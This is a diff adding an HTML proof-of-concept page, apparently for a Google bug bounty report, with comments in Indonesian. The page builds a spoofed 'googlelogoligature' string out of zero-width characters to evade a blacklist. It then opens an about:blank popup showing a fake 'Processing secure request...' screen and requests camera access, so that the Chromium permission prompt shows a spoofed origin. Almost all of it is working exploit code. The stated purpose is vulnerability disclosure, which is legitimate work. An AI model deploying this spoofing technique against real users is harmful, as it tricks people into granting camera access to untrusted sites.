@@ -1,0 +1,88 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Bug Hunters - ZWJ Bypass PoC</title>
+    <style>
+        body { 
+            font-family: sans-serif; 
+            text-align: center; 
+            margin-top: 20vh; 
+            background: #202124; 
+            color: #e8eaed; 
+        }
+        button { 
+            padding: 16px 32px; 
+            font-size: 18px; 
+            background: #8ab4f8; 
+            color: #202124; 
+            border: none; 
+            border-radius: 8px; 
+            font-weight: bold; 
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+        }
+        button:active { background: #aecbfa; }
+    </style>
+</head>
+<body>
+    <h1>Ligature Permission Spoofing</h1>
+    <p>Bypassing Issue #391788835 via ZWJ Smuggling</p>
+    <button id="triggerBtn">Trigger Vulnerability</button>
+
+    <script>
+        // 1. Meracik Poison String menggunakan ZWJ, ZWNJ, dan BOM
+        // Kita mencoba merangkai kata "googlelogoligature" 
+        // dengan sisipan karakter transparan agar lolos dari filter blacklist C++.
+        const ZWJ = '\u200D';
+        const ZWNJ = '\u200C';
+        const BOM = '\uFEFF';
+        
+        // Hasilnya secara byte tidak sama dengan string "googlelogoligature", 
+        // tapi secara visual di HarfBuzz (Android font renderer) akan merapat.
+        const poisonString = `g${ZWJ}o${BOM}o${ZWJ}g${ZWNJ}l${ZWJ}elogoligature`;
+
+        document.getElementById('triggerBtn').addEventListener('click', () => {
+            // 2. Trik about:blank (Sesuai laporan lu sebelumnya)
+            // TAPI, kita injeksi poison string ke bagian fragment (hash) URL.
+            // Di banyak skenario Android, parser akan menarik fragment ini ke UI prompt.
+            let newWin = window.open('about:blank#' + poisonString);
+            
+            if (!newWin) {
+                alert('Popup blocked! Tolong "Always Allow Pop-ups" dari site ini bro.');
+                return;
+            }
+
+            // Beri jeda sepersekian detik agar window about:blank selesai dirender
+            setTimeout(() => {
+                // 3. Injeksi Title dengan Poison String
+                // Jika Chromium gagal memvalidasi origin di popup about:blank,
+                // ia akan melakukan fallback dan mengambil string dari document.title
+                newWin.document.title = poisonString;
+
+                // 4. Injeksi tampilan ke window baru agar terlihat meyakinkan
+                newWin.document.body.innerHTML = `
+                    <meta name="viewport" content="width=device-width, initial-scale=1">
+                    <style>
+                        html { background: #fff; color: #202124; font-family: sans-serif; text-align: center; }
+                        h2 { margin-top: 30vh; }
+                    </style>
+                    <h2>Processing secure request...</h2>
+                `;
+
+                // 5. EKSEKUSI: Panggil API Kamera
+                newWin.navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        // Matikan kamera langsung kalau user klik Allow
+                        stream.getTracks().forEach(track => track.stop());
+                        newWin.document.body.innerHTML += `<h3 style="color: green;">BYPASS SUCCESS - CAMERA GRANTED</h3>`;
+                    })
+                    .catch(err => {
+                        console.log("Permission denied or closed", err);
+                    });
+            }, 150);
+        });
+    </script>
+</body>
+</html>
